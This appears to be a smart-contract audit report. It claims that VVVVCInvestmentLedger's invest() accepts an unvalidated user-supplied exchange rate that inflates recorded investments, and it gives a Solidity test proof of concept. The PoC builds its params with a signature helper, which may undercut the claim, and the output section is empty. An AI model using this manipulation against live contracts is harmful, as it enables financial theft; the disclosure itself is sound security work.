# An attacker can manipulate exchange rate more higher than actual exchange rate

## Summary

In the `VVVVCInvestmentLedger::invest()` function, the contract relies on user-provided parameters, including `_params.exchangeRateNumerator`, to calculate the stablecoin equivalent of the user's investment. However, there is no validation on the value of `_params.exchangeRateNumerator`, which allows malicious users to manipulate this value, inflating their investment amount.

## Vulnerability detail

In `VVVVCInvestmentLedger::invest()` we know that every params are filled by a user. It affect for state in contract especially calculating `preFeeStableAmountEquivalent`. Lets see code associated : 

https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCInvestmentLedger.sol#L165-L166

the variable `preFeeStableAmountEquivalent` is calculated by some operations with `_params.exchangeRateNumerator`. We have an expectations that every single user fill a value of `_params.exchangeRateNumerator` honestly with actual exchange rate. But sometimes, we will meet a malicious user to pass this value more higher than actual exchange rate. Lets build an example : 
1. A malicious user want to invest to the protocol with USDC token.
2. He want to invest 1000 USDC, normally he must fill `_params.exchangeRateNumerator` with `1e6`  (assume that `exchangeRateDenominator` is `1e6`).
3. Other hand, he fills the  `_params.exchangeRateNumerator` with value `10e6`
4. As a result, the `preFeeStableAmountEquivalent` is calculated as:

   ```solidity
   preFeeStableAmountEquivalent = (1000 * 10e6) / 1e6 = 10000 USDC (stablecoin equivalent)
   ```
   This causes the user's investment to be recorded as 10,000 USDC instead of the intended 1000 USDC, inflating the user's investment by a factor of 10.

## Impact

Malicious users can manipulate `_params.exchangeRateNumerator` to inflate their investment value unfairly. This disrupts allocation accuracy, breaches round limits, and risks financial loss, undermining trust in the system.

## Poc

The function test following `VVVVCInvestmentLedgerUnitTests::testExchangeRateManipulation` : 

```solidity
function testExchangeRateManipulation() public {
        uint256 newExchangeRateNumerator = 10e6;
        uint256 newFeeNumerator = 0;

        VVVVCInvestmentLedger.InvestParams memory params = generateInvestParamsWithSignature(
            sampleInvestmentRoundIds[0],
            investmentRoundSampleLimit,
            sampleAmountsToInvest[0],
            userPaymentTokenDefaultAllocation,
            newExchangeRateNumerator, 
            newFeeNumerator,
            sampleKycAddress,
            activeRoundStartTimestamp,
            activeRoundEndTimestamp
        );
        investAsUser(sampleUser, params);
        uint256 userInvested = LedgerInstance.kycAddressInvestedPerRound(
            sampleKycAddress,
            sampleInvestmentRoundIds[0]
        );

        assertNotEq(PaymentTokenInstance.balanceOf(address(LedgerInstance)), userInvested);

        console.log("Balance of ledger in USDC : ", PaymentTokenInstance.balanceOf(address(LedgerInstance)));
        console.log("Total user invested : ", userInvested);
    }
```
   
output :
